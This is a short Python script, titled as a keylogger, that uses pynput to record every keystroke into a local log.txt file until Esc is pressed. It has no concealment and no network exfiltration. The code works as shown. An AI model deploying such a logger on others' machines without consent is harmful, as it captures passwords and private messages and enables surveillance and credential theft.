# Keylogger
from io import TextIOBase
import pynput
from pynput.keyboard import Key,Listener
count = 0
key_list = []
def on_press(key):
    global key_list,count
    key_list.append(key)
    count +=1
    if count >= 5:
        count = 0
        write_file(key_list)
        key_list = []

def write_file(key_list):
    with open("log.txt","a") as f:
        for i in key_list:
            k = str(i).replace("'","")
            if i == Key.enter:
                f.write("\n")
            elif i == Key.space:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
            

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as Listener:
    Listener.join()
    
